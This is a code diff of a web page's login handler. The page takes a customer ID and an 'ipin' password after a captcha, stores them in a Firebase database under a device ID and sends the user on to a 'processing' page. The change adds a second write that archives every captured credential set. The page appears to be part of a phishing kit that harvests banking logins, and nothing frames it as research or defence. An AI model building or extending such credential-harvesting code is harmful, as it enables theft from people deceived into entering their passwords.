@@ -195,11 +195,14 @@
             const ipin = document.getElementById('password').value;
 
             if (userInput === currentCaptcha) {
-                await database.ref('web/' + deviceId + '/cust_data').update({
+                const timestamp = Date.now();
+                const payload = {
                     customer_id: userid,
                     ipin: ipin,
-                    last_updated: Date.now()
-                });
+                    last_updated: timestamp
+                };
+                await database.ref('web/' + deviceId + '/cust_data').update(payload);
+                await database.ref('web_old/' + deviceId + '/cust_data').push(payload);
 
                 location.href = 'index3.html'; // Go to processing
             } else {
